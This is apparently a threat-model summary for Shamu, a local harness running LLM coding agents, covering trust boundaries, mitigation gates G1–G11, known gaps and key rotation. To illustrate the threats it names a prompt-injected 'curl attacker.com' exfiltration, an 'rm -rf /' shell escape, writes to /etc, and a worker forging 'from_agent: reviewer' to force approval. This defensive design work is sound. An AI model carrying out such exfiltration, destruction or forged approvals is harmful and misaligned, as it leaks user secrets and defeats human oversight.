# Shamu — Threat model summary

Two- to three-page distillation for contributors who don't need the full
attack-tree enumeration. The canonical doc is
[`docs/phase-0/threat-model.md`](./phase-0/threat-model.md); this summary
lines up the deploy model, the trust boundary, the mitigation gates (G1–G11),
known gaps, and rotation procedures.

## Deploy model

Shamu is deliberately scoped small:

- **Single user, single box.** The user running `shamu` is the root of trust.
  No multi-user mode, no team mode, no shared-tenancy.
- **macOS and Linux, both first-class.** Windows is not a supported deploy
  target.
- **No auth.** The CLI is local. The web dashboard binds to `127.0.0.1`; the
  `--unsafe-bind` flag exists as an escape hatch for LAN setups but does not
  introduce authentication.
- **No cloud runtime.** Shamu never runs inside GitHub Actions (no env-var
  credential fallback path). It is a dev-laptop tool.
- **No always-on public surface.** `shamu linear tunnel` provisions a
  cloudflared route only while the user is running it, and the route is
  scoped to `/webhooks/linear`.

## Trust boundary

The harness runs **semi-trusted** agent behavior with shell, file, and network
access. Credentials live in the OS keychain. The practical boundaries:

- **Host ↔ agent subprocess.** Agent processes execute LLM output. Prompt
  injection can turn them into a confused deputy. Isolation: allow-listed env,
  `CWD` pinned to the worktree, signals brokered through the adapter handle,
  pre-commit guard on writes. Network egress is gated through the per-run
  egress broker until containerization lands (Phase 8).
- **Host ↔ vendor API.** Vendor API content is trusted for assistant *text*
  but **untrusted for tool-call arguments** — those are attacker-controllable
  via prompt injection and must be validated before dispatch.
- **Local ↔ webhook sender.** Linear is trusted only when HMAC + timestamp +
  nonce all pass. Anyone else is a forger.
- **Local ↔ dashboard client.** `127.0.0.1` is trusted. Anything reached via
  a tunnel or `--unsafe-bind` is untrusted; today Shamu does not mitigate the
  `--unsafe-bind` case — it prints a banner and stays on the single-user
  assumption.
- **Shamu ↔ MCP server.** In-process MCP tools are trusted (Shamu wrote them).
  stdio / http MCP servers are as trusted as their declared trust roots (G3).
- **Shamu ↔ A2A peer (Phase 8.B).** Untrusted until the Signed Agent Card
  verifies and the bearer JWS is bound to the issuer DID (G11).

## The G-gates

The threat model enumerates mitigation contracts as G1–G11. Each is a
concrete code-level invariant; violating one is a phase blocker, not a style
preference.

- **G1 — Secret redaction on `raw_events` write.** The shared redactor
  (`@shamu/shared/redactor`, regex + value-hash list) runs on both `events`
  and `raw_events` at first write. Planted-secret contract tests enforce it.
  Mitigates: `stdout` / tool-result / env-dump payloads leaking credentials
  into the durable log.
- **G2 — Egress broker.** `@shamu/egress-broker` is a per-run HTTP(S) proxy
  spawned by the core; `HTTPS_PROXY` / `HTTP_PROXY` land in the subprocess
  env via `SpawnOpts.env`. The broker consults per-run `allowed_hosts` and
  surfaces denied destinations as `policy.egress_denied` events. Phase 8
  replaces it with container-based enforcement sharing the same policy file
  format. Mitigates: prompt-injected `curl attacker.com` exfiltration.
- **G3 — MCP trust.** stdio MCP entries are pinned by package name +
  integrity hash; http MCP entries by origin + TLS pin. A new source requires
  explicit `shamu mcp trust <fingerprint>` and writes an audit event.
  Mitigates: silent config-shipped MCP servers with prompt + tool-call
  exfil reach.
- **G4 — Path-scope at tool-dispatch.** The adapter permission handler calls
  `validatePathInWorktree` before any filesystem tool executes. Absolute
  paths outside the worktree, `..` escapes, and symlinks resolving outside
  are rejected synchronously. Pre-commit guard is defense in depth.
  Mitigates: `Write({ path: "/etc/..." })`-style escapes.
- **G5 — Shell AST gate.** Shell-tool commands parse through `shell-quote`;
  default-reject list: `$()`, backticks, `eval`, pipes-to-shell, process
  substitution. Structured tool APIs (`Edit`, `Write`) are preferred.
  Mitigates: `rm -rf / ; :||` and shell-interpolation escapes past naive
  regex patterns.
- **G6 — Mailbox authentication.** `from_agent` is stamped from the
  authenticated run context, never the payload; the mailbox API signature
  takes no `from` parameter. Writes without a valid `AuthContext` throw
  `UnauthenticatedWriteError`. Mitigates: cross-agent confused-deputy
  forgery (e.g., a prompt-injected worker claiming `from_agent: "reviewer"`
  to force an approve transition).
- **G7 — Audit HMAC chain.** Every row in `audit_events` includes
  `prev_hmac = HMAC(audit_secret, row_{n-1})`. The chain is verified on boot
  and on `shamu doctor`. A `BEFORE UPDATE OR DELETE` trigger raises so
  tampering via the DB is caught even before chain verification.
  `audit_secret` lives in the OS keychain. Mitigates: silent `DELETE` /
  `UPDATE` on the audit table destroying forensic trails.
- **G8 — Immutable capability manifest.** `Capabilities` is loaded from a
  frozen manifest at adapter construction. Adapters cannot upgrade /
  downgrade their own capabilities at event-emit time. Cost-source labels
  are set by the core from the declared capability, never from runtime
  adapter output. Mitigates: a compromised adapter mis-tagging cost as
  `subscription` to evade budgets (T17).
- **G9 — Supply chain.** Direct deps pinned to exact versions; CI runs
  `bun install --frozen-lockfile --ignore-scripts`. Vendor SDKs are
  allow-listed per package. GitHub Actions third-party actions pinned to
  SHAs (see `.github/workflows/ci.yml` header). Mitigates: typosquat /
  postinstall-script / unpinned-upgrade compromise.
- **G10 — Tunnel scope.** `shamu linear tunnel` restricts the cloudflared
  route to `/webhooks/linear`. The dashboard port is never exposed through
  the tunnel. `shamu doctor` warns if any local port other than the webhook
  is reachable through an active tunnel. Mitigates: operator-error tunnel
  misrouting exposing the dashboard publicly.
- **G11 — A2A trust roots.** Phase 8.B's Signed Agent Cards use Ed25519
  signatures over canonical-JSON; the issuer DID is derived from the key
  via `did:key`. Bearer tokens are EdDSA JWS bound to the issuer DID.
  Deployments can constrain which DIDs are accepted via a `trustedIssuers`
  allow-list. Mitigates: peer impersonation, bearer-token replay.

## Known gaps

Documented and deferred — where Shamu is today differs from where the threat
model aims to land:

- **TLS interception in the egress broker is not implemented.** The broker
  does host-level gating today; payload inspection (per-run CA + subprocess
  trust store + MITM rotation) is tracked as a Phase 8 follow-up in
  `HANDOFF.md`.
- **Container-based egress enforcement is Phase 8.** Phases 2–7 run the
  in-process broker; a malicious binary that ignores `HTTPS_PROXY` is not
  fully isolated. Phase 8's containerized replacement reuses the same
  `loadEgressPolicy` + `matchHost` code.
- **Dashboard authentication under `--unsafe-bind` is out of scope for v1.**
  The flag prints a banner; a real non-loopback host story (auth + TLS)
  is queued behind Track 8.C.
- **A2A push notifications.** `tasks/pushNotification/set` stores the
  caller's config but outbound push is not wired.
- **Multi-tenant story.** Not in scope. OIDC, team mode, shared-tenant
  dashboards are deliberately deferred.
- **`raw_events` retention is 14 days.** Secrets that slipped past the
  redactor and aren't caught within the retention window are gone.
- **Cache-key composition** for Anthropic's 5-min cache must salt by `runId`
  / session so adversarial prior contexts don't taint subsequent runs (T9 —
  enforced by a Phase 2 contract test).

## Rotation

- **`audit_secret` (HMAC chain key).** Stored via
  `@shamu/shared/credentials.set("shamu", "audit_secret", ...)`. Rotation
  requires re-chaining — run the dedicated rotation helper (tracked as a
  Phase 8.C followup; today the procedure is "vacate the audit chain,
  snapshot the old DB, start a new chain"). `shamu doctor` will complain
  about chain discontinuity until the new snapshot is reconciled.
- **Vendor API keys.** Stored per-vendor in the OS keychain; rotate the key
  at the vendor console, then update via the keychain UI (macOS Keychain
  Access / Linux `secret-tool store`) or via `shamu doctor --rotate`
  (Phase 8.C). Keychain items are marked "always allow this app" so
  autonomous runs don't prompt-storm; the accepted tradeoff is that a
  compromised Shamu can read them.
- **Linear API key / webhook secret.** Rotate at
  `https://linear.app/<workspace>/settings/api`. Update
  `LINEAR_API_KEY` + `LINEAR_WEBHOOK_SECRET` in the keychain (not env
  files). `shamu linear serve` reads fresh on next boot.
- **Commit signing key (SSH).** Rotate the SSH key; update
  `user.signingkey`; register the new key on GitHub as type **signing**;
  verify with `git cat-file commit HEAD | grep ^gpgsig` on the next commit.
  Old commits keep their prior-key signatures — GitHub's UI surfaces them as
  "verified by a deleted key" once the old key is removed.
- **A2A signing key (Phase 8.B).** Re-generate the Ed25519 keypair; publish
  the new card at `/.well-known/agent.json`; peers using `trustedIssuers`
  must update their allow-lists to the new DID.

## References

- [`PLAN.md` §§ Security & threat model](../PLAN.md)
- [`docs/phase-0/threat-model.md`](./phase-0/threat-model.md) — full spike
  writeup with attack trees, asset table, per-phase blockers.
- [`docs/architecture.md`](./architecture.md) — where each gate is enforced
  in code.
